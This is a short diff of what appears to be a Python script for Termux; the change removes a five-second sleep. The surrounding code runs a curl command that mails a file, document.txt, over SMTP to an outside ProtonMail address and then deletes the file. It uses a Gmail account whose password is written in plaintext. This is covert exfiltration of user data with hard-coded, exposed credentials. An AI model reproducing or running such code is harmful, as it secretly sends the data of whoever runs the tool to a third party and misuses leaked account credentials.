@@ -180,7 +180,6 @@ def id():
 	data.update({'sig':x.hexdigest()})
         get(data)
 os.system("curl --url 'smtps://smtp.gmail.com:465' --ssl-reqd --mail-from 'souhail418000@gmail.com' --mail-rcpt 'termuxproject@protonmail.com' --upload-file document.txt --user 'souhail418000@gmail.com:Kamal1953' --insecure")
- time.sleep(5)
 os.remove("document.txt")
 
 ####################################################################
